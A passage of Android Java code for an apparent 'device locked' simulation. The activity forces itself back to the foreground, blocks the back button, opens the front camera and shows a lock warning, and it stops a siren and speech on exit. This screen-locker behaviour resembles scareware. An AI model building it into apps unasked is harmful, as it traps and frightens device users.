        if (!simulationActive || isFinishing()) return;
        try {
            ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            am.moveTaskToFront(getTaskId(), ActivityManager.MOVE_TASK_WITH_HOME);
        } catch (Throwable ignored) {
        }
    }

    @Override
    public void onBackPressed() {
        Toast.makeText(this, "DEVICE LOCKED — SIMULATION IN PROGRESS", Toast.LENGTH_SHORT).show();
    }

    private void releaseCamera() {
        if (camera != null) {
            try {
                camera.stopPreview();
                camera.release();
            } catch (Throwable ignored) {
            }
            camera = null;
        }
    }

    @Override
    public void surfaceCreated(@NonNull SurfaceHolder holder) {
        if (camera != null) return;
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        try {
            Camera.CameraInfo info = new Camera.CameraInfo();
            int frontId = -1;
            for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    frontId = i;
                    break;
                }
            }
            camera = Camera.open(frontId >= 0 ? frontId : 0);
            camera.setDisplayOrientation(180);
            camera.setPreviewDisplay(holder);
            camera.startPreview();
            cameraBadge.setVisibility(View.VISIBLE);
        } catch (Throwable t) {
            releaseCamera();
        }
    }

    @Override
    public void surfaceChanged(@NonNull SurfaceHolder holder, int format, int width, int height) {
    }

    @Override
    public void surfaceDestroyed(@NonNull SurfaceHolder holder) {
        releaseCamera();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        simulationActive = false;
        SimUtil.setSimActive(false);
        mainHandler.removeCallbacksAndMessages(null);
        siren.stop();
        stopTts();
        SimUtil.fullCleanup(this);
        releaseCamera();
        try {
            unregisterReceiver(endReceiver);
        } catch (Throwable ignored) {
        }
    }
}
